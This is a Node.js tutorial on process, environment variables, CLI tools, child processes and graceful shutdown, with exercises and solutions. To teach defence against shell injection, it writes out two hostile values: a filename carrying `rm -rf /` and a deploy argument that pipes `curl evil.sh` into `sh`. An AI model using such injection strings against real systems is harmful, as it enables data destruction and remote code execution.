Process, Environment & CLI Runtime Foundations

What you'll master: the process object — env vars, argv, exit codes, stdio, signals — building real CLI tools with parseArgs, spawning child processes safely, and graceful shutdown: the lifecycle discipline every deployed service needs. Prerequisites: The Node Runtime, Files & Buffers.

Part 1 — process: Your Program's Cockpit

process.argv        // ["/usr/bin/node", "/app/cli.js", "--verbose", "input.txt"]
                    //   [0] node binary, [1] script — YOUR args start at index 2
process.env         // environment variables: { PATH, HOME, NODE_ENV, … } — all STRINGS
process.cwd()       // where the user ran the command (vs import.meta.dirname — fs lesson)
process.exitCode = 1 // set the exit status; process exits when work drains
process.exit(1)      // exit NOW — skips pending I/O and callbacks (see Part 5!)
process.platform     // "linux" | "darwin" | "win32"
process.uptime()     // seconds alive
process.memoryUsage()// { rss, heapUsed, … } — the Performance lesson reads these

// stdio — three streams every process owns:
process.stdout.write("results\n");    // pipeable OUTPUT (console.log wraps this)
process.stderr.write("progress…\n");  // logs/diagnostics — SEPARATE channel
process.stdin                          // input stream (Part 4)
// The Unix contract: stdout is DATA (parseable, pipeable), stderr is COMMENTARY.
// `mytool | jq` works only if you kept logs off stdout.

Part 2 — Environment Variables: Config's Front Door

// Why env vars (12-factor config): same build, different environments —
// dev/staging/prod differ by ENV, not by code or rebuild.
const port = Number(process.env.PORT ?? 3000);     // ALWAYS strings — parse them!
const isProd = process.env.NODE_ENV === "production";

// "FLAG=false" is a truthy string — the classic bug:
if (process.env.ENABLE_CACHE) {}                   // ❌ true for "false", "0", ""… set at all
const cacheOn = process.env.ENABLE_CACHE === "true";   // ✅ explicit parse

// .env files for local dev — built into Node now:
// $ node --env-file=.env server.js        (no dotenv package needed, Node 20+)
// .env is gitignored ALWAYS; commit .env.example with dummy values as docs.

// The pattern that scales — validate once, export a typed config object:
function loadConfig() {
  const required = k => {
    const v = process.env[k];
    if (!v) { console.error(`Missing required env var: ${k}`); process.exit(1); }
    return v;
  };
  return {
    port: Number(process.env.PORT ?? 3000),
    dbUrl: required("DATABASE_URL"),
    logLevel: process.env.LOG_LEVEL ?? "info",
  };
}
export const config = loadConfig();     // crash AT STARTUP with a named var —
// not 20 minutes later with "undefined is not a valid connection string".
// (The full config/secrets story — schemas, vaults — is the Production section.)

Part 3 — Building a Real CLI

import { parseArgs } from "node:util";             // built-in arg parser

const { values, positionals } = parseArgs({
  options: {
    out:     { type: "string", short: "o", default: "report.json" },
    verbose: { type: "boolean", short: "v", default: false },
    help:    { type: "boolean", short: "h" },
  },
  allowPositionals: true,
});

if (values.help || positionals.length === 0) {
  console.error(`Usage: analyze [options] <files…>
  -o, --out <file>   output path (default: report.json)
  -v, --verbose      chatty progress on stderr`);
  process.exit(values.help ? 0 : 2);               // help asked-for = success;
}                                                   // missing args = error code

// $ analyze -v -o out.json a.log b.log
// values = { out: "out.json", verbose: true }, positionals = ["a.log", "b.log"]

// CLI craft that separates tools people love:
// • exit codes: 0 success, 1 runtime failure, 2 usage error — scripts depend on these
// • errors + progress → stderr; results → stdout (pipeable)
// • respect NO_COLOR; detect process.stdout.isTTY before fancy output
//   (piped output gets plain text; interactive gets colors/spinners)
// • make it installable: package.json "bin": { "analyze": "./cli.js" } +
//   #!/usr/bin/env node shebang → npx analyze / npm i -g
// (commander/yargs add subcommands and rich help when parseArgs outgrows —
//  same concepts, more ceremony.)

Part 4 — Child Processes: Running Other Programs

import { spawn, execFile } from "node:child_process";
import { promisify } from "node:util";
const pExecFile = promisify(execFile);

// 1. execFile — run a program, collect its output (small, finite output):
const { stdout } = await pExecFile("git", ["rev-parse", "HEAD"]);
console.log("deployed commit:", stdout.trim());

// 2. spawn — stream a long-running/large-output process:
const child = spawn("ffmpeg", ["-i", input, "-f", "mp3", output]);
child.stderr.on("data", chunk => progress(chunk));   // streams, not buffers
const code = await new Promise(res => child.on("close", res));
if (code !== 0) throw new Error(`ffmpeg exited ${code}`);

// 3. exec — runs a command THROUGH A SHELL. The dangerous one:
exec(`convert ${userFilename} out.png`);             // ❌ INJECTION:
// userFilename = "x.png; rm -rf /" — the shell happily obliges.
// RULE: execFile/spawn with an ARGS ARRAY (no shell parsing) whenever any
// input is dynamic. exec is for fixed strings you typed yourself, if ever.
//
// Node-in-Node: fork() spawns another Node script with a built-in message
// channel (child.send / process.on("message")) — the primitive behind the
// cluster module (Scaling lesson).

Part 5 — Signals, Exit & Graceful Shutdown

// How processes are told to stop:
// SIGINT  — Ctrl+C in a terminal
// SIGTERM — "please stop": what Docker, Kubernetes, systemd send first
// SIGKILL — unblockable kill -9; you get NO chance to clean up (after a grace period)

// The graceful-shutdown pattern EVERY service needs:
const server = http.createServer(handler).listen(config.port);

async function shutdown(signal) {
  console.error(`${signal} received — draining…`);
  server.close(() => console.error("no more connections"));  // stop ACCEPTING,
                                                              // finish in-flight
  await db.pool.end();                                        // release resources
  clearInterval(metricsTimer);                                // cancel keep-alives
  // nothing pending now → event loop drains → process exits with 0 naturally
}
process.on("SIGTERM", () => shutdown("SIGTERM"));
process.on("SIGINT",  () => shutdown("SIGINT"));
// Why it matters: without this, K8s sends SIGTERM, nothing listens, the grace
// period lapses, SIGKILL lands mid-request — users get dropped connections and
// half-finished writes on every single deploy.

// process.exit() vs natural exit:
process.exit(0)     // IMMEDIATE: pending writes lost, callbacks skipped.
                    // Right for CLIs after sync work & usage errors.
process.exitCode = 1 // set status, let the loop drain — right when async
                    // cleanup matters. Prefer this in servers.

// The last-resort handlers (Logging lesson wires these to telemetry):
process.on("uncaughtException", err => { log.fatal(err); process.exit(1); });
process.on("unhandledRejection", err => { log.fatal(err); process.exit(1); });
// After an uncaught exception the process state is UNKNOWN — log and die;
// the process manager restarts you clean. Never "keep running anyway".

Part 6 — Process Hygiene in Production (Senior Layer)

// 1. One process, one job: web servers don't also run cron — separate
//    processes (or a worker) per role; the scheduler/orchestrator supervises.
// 2. Crash-only design: since SIGKILL and power loss exist anyway, make
//    startup idempotent and state externally durable — then a crash is just
//    an ungraceful restart, and graceful shutdown is an optimization.
// 3. Health endpoints reflect readiness, not liveness alone: during shutdown,
//    fail readiness FIRST so the load balancer drains you before close().
// 4. stdout logging in containers: write JSON lines to stdout, let the
//    platform collect — files and rotation are the platform's job now
//    (the fs lesson's rotating logger is for bare-metal/CLI worlds).
// 5. env is inherited by children — spawn with a CLEANED env for untrusted
//    tools: spawn(cmd, args, { env: { PATH: process.env.PATH } }).

Interview Questions

Beginner: Where do a CLI's arguments live and what's at indexes 0 and 1?

process.argv — an array of strings: index 0 is the node executable's path, index 1 the script's path, and user arguments start at index 2. Real parsing (flags, defaults, help) goes through util.parseArgs or a library rather than hand-slicing.

Beginner: Why configure via environment variables instead of a config file in the repo?

The same built artifact runs in every environment — dev/staging/prod differ only in the env injected at run time (12-factor). Secrets stay out of git; platforms (Docker, K8s, CI) all speak env natively; and per-instance overrides need no code change. Locally, --env-file=.env simulates it, with .env gitignored and .env.example as documentation.

Mid: Walk through what happens on kill <pid> for a well-built Node service.

kill sends SIGTERM. The registered handler runs: readiness checks start failing (load balancer drains traffic), server.close() stops accepting new connections while in-flight requests complete, resources release (DB pools end, timers clear), and with nothing left pending the event loop drains and the process exits 0 naturally. If it exceeds the orchestrator's grace period, SIGKILL ends it regardless — which is why shutdown work is bounded, and why state must survive an ungraceful death anyway (crash-only thinking).

Mid: exec vs execFile vs spawn vs fork?

exec: runs a command line through a shell, buffers output — convenient and injection-prone; fixed strings only. execFile: runs a binary directly with an args array (no shell) and buffers output — the safe default for finite output. spawn: same no-shell safety but streams stdio — for long-running processes or large output. fork: spawn specialized for Node scripts, adding an IPC message channel — the building block of cluster and worker orchestration.

Senior: Design the full lifecycle policy for a payment-processing worker (queue consumer).

Startup: validate config (fail fast, named var), connect resources, THEN start consuming, then report ready. Processing: each job idempotent (an at-least-once queue plus crashes means redelivery — dedupe by job id) with acks only after durable completion. SIGTERM: stop pulling new jobs, finish or checkpoint in-flight ones within a deadline shorter than the orchestrator's grace period, ack/nack appropriately, release connections, exit 0. uncaughtException/unhandledRejection: log fatal with job context, nack the current job (redelivery), exit 1 — the supervisor restarts clean; never continue on unknown state, especially near money. Health: liveness (process responsive) and readiness (connected + consuming) separated. The through-line: the process is disposable; correctness lives in idempotency + durable state, not in never dying.

Senior: A teammate's CLI works interactively but corrupts data when scripted: mytool export | psql loads garbage rows. Hypotheses?

Channel-mixing: progress messages, warnings, or a colorful banner written to stdout are interleaved with the data psql reads — the #1 CLI sin; diagnostics belong on stderr. Related: TTY-detection features (spinners, ANSI color codes) emitted even when piped — check isTTY and disable; ANSI escapes inside "data" corrupt any parser. Also possible: process.exit() after the final write — stdout is async when piped, so the exit truncated the tail of the export (use exitCode and drain). Each is invisible interactively because humans read around noise and terminals hide the truncation timing — pipes don't.

1 (easy): Build envcheck.js: takes var names as args, prints ✓/✗ per name (set/unset), exits 1 if any are missing.
Solution 
const names = process.argv.slice(2);
let missing = 0;
for (const name of names) {

2 (easy): Why does this feature flag misbehave in prod where ops set ENABLE_BETA=0? const beta = Boolean(process.env.ENABLE_BETA);
Solution

3 (medium): Build wordfreq: a proper CLI (parseArgs) reading files (or stdin when no args), printing the top N words as TSV on stdout, progress on stderr, correct exit codes.
Solution 
#!/usr/bin/env node
import { parseArgs } from "node:util";
import fs from "node:fs/promises";

const { values, positionals } = parseArgs({
  options: { top: { type: "string", short: "n", default: "10" } },
  allowPositionals: true,
});

async function readAll() {
  if (positionals.length === 0) {                       // stdin mode: pipeable
    let text = "";
    for await (const chunk of process.stdin) text += chunk;
    return text;
  }
  const parts = await Promise.all(positionals.map(f => fs.readFile(f, "utf8")));
  return parts.join("\n");
}

try {
  const text = await readAll();
  process.stderr.write(`analyzing ${text.length} chars…\n`);   // commentary → stderr
  const counts = new Map();
  for (const w of text.toLowerCase().match(/[a-z']+/g) ?? [])
    counts.set(w, (counts.get(w) ?? 0) + 1);
  [...counts.entries()]
    .sort((a, b) => b[1] - a[1])
    .slice(0, Number(values.top))
    .forEach(([w, n]) => process.stdout.write(`${w}\t${n}\n`)); // data → stdout
} catch (err) {
  process.stderr.write(`wordfreq: ${err.message}\n`);
  process.exitCode = 1;
}
// $ cat book.txt | wordfreq -n 5      $ wordfreq a.txt b.txt | sort
4 (medium): Add graceful shutdown to the runtime lesson's HTTP server: SIGTERM/SIGINT drain in-flight requests, a 10s deadline force-exits with code 1, and a second Ctrl+C exits immediately.
Solution 
const server = http.createServer(handler).listen(3000);
let shuttingDown = false;

function shutdown(signal) {
  if (shuttingDown) process.exit(130);        // second Ctrl+C: user means NOW
  shuttingDown = true;
  console.error(`${signal}: draining (10s max)…`);

  server.close(() => {
    console.error("drained cleanly");
    // nothing else pending → natural exit 0
  });

  const deadline = setTimeout(() => {
    console.error("deadline hit — forcing exit");
    process.exit(1);
  }, 10_000);
  deadline.unref();                            // ⭐ don't let the TIMER keep the
}                                              //   process alive after a clean drain
process.on("SIGTERM", () => shutdown("SIGTERM"));
process.on("SIGINT",  () => shutdown("SIGINT"));
// unref() is the subtle piece: an active timer counts as pending work; without
// it the "clean" path would still wait the full 10 seconds to exit.
5 (medium): Write gitinfo.js exporting getRepoInfo() → { branch, commit, dirty } using child processes safely, with a clean error when not in a git repo.
Solution 
import { execFile } from "node:child_process";
import { promisify } from "node:util";
const run = promisify(execFile);

export async function getRepoInfo(cwd = process.cwd()) {
  try {
    const [branch, commit, status] = await Promise.all([   // concurrent — L1's thesis
      run("git", ["rev-parse", "--abbrev-ref", "HEAD"], { cwd }),
      run("git", ["rev-parse", "--short", "HEAD"], { cwd }),
      run("git", ["status", "--porcelain"], { cwd }),
    ]);
    return {
      branch: branch.stdout.trim(),
      commit: commit.stdout.trim(),
      dirty: status.stdout.trim().length > 0,
    };
  } catch (err) {
    if (/not a git repository/i.test(err.stderr ?? ""))
      throw new Error(`Not a git repository: ${cwd}`);
    throw err;
  }
}
// execFile + args arrays: cwd may be user-supplied, but it's an OPTION, never
// part of a shell string — no injection surface.
6 (hard): Build a tiny process supervisor: supervise.js <script> runs a Node script, restarts it on non-zero exit with exponential backoff (1s→2s→4s… cap 30s), resets backoff after 60s of healthy running, forwards SIGTERM to the child, and gives up after 5 straight fast failures.
Solution 
#!/usr/bin/env node
import { spawn } from "node:child_process";

const script = process.argv[2];
let delay = 1000, strikes = 0, child = null, stopping = false;

function start() {
  const startedAt = Date.now();
  child = spawn(process.execPath, [script], { stdio: "inherit" });

  child.on("close", code => {
    if (stopping) process.exit(code ?? 0);
    if (code === 0) process.exit(0);                    // clean finish: we're done

    const ranMs = Date.now() - startedAt;
    if (ranMs > 60_000) { delay = 1000; strikes = 0; }  // healthy run resets
    else strikes++;

    if (strikes >= 5) {
      console.error("supervise: 5 fast failures — giving up");
      process.exit(1);
    }
    console.error(`supervise: exit ${code}, restart in ${delay}ms (strike ${strikes})`);
    setTimeout(start, delay);
    delay = Math.min(delay * 2, 30_000);                // exponential, capped
  });
}

process.on("SIGTERM", () => { stopping = true; child?.kill("SIGTERM"); });
process.on("SIGINT",  () => { stopping = true; child?.kill("SIGTERM"); });
start();
// stdio: "inherit" pipes the child's output straight through; signal
// forwarding makes the pair behave as one unit to the orchestrator above it.
// ponytail: this is pm2/systemd's core loop in 40 lines — use those in prod;
// build this once to know what they do.
7 (hard): Code-review this deploy script line by line: exec(`rsync -r ${process.argv[2]} prod:/app && ssh prod "cd /app && npm install && pm2 restart all"`, (e, out) => console.log(out));
Solution 
// 1. exec + interpolated argv[2]: shell injection — an argument of
//    ". ; curl evil.sh | sh" deploys an attacker. → spawn/execFile, args arrays,
//    and validate the path exists locally first.
// 2. Error swallowed: (e, out) ignores e — rsync can fail and the script prints
//    undefined and exits 0. CI marks the deploy green. → check e, set exitCode.
// 3. npm install on prod: unpinned resolution at deploy time (npm lesson) —
//    prod gets a different tree than CI tested. → npm ci (and better: build an
//    artifact/image in CI, copy THAT, never resolve deps on prod).
// 4. pm2 restart all: hard restart drops in-flight requests (this lesson) —
//    → pm2 reload (graceful), and "all" restarts unrelated apps on the box.
// 5. No output streaming: exec buffers — a long deploy shows nothing until the
//    end (and can overflow the buffer). → spawn with stdio: "inherit".
// 6. Structural: a deploy "script" as one shell line has no rollback, no
//    health check after restart, no lockout against concurrent deploys.
//    → a real script (or CI/CD pipeline — the Deployment lesson) with steps,
//    checks, and honest exit codes at each stage.

🎯 Key Takeaways

  • process is the cockpit: argv (yours from index 2), env (all strings — parse and validate once at startup), cwd, exit codes, stdio.
  • The Unix contract: data on stdout, diagnostics on stderr, honest exit codes (0/1/2) — pipes and CI depend on all three.
  • CLIs: parseArgs + shebang + "bin"; respect TTY detection and NO_COLOR; secrets never travel in argv.
  • Child processes: execFile/spawn with args arrays always; exec's shell is an injection engine; fork adds IPC for Node-to-Node.
  • Graceful shutdown is non-optional in deployed services: SIGTERM → fail readiness → close → drain → release → natural exit; bounded by the orchestrator's grace period; crash-only design makes even SIGKILL survivable.
  • On uncaught errors: log fatal and exit — process state is unknown; supervisors exist to restart you clean.
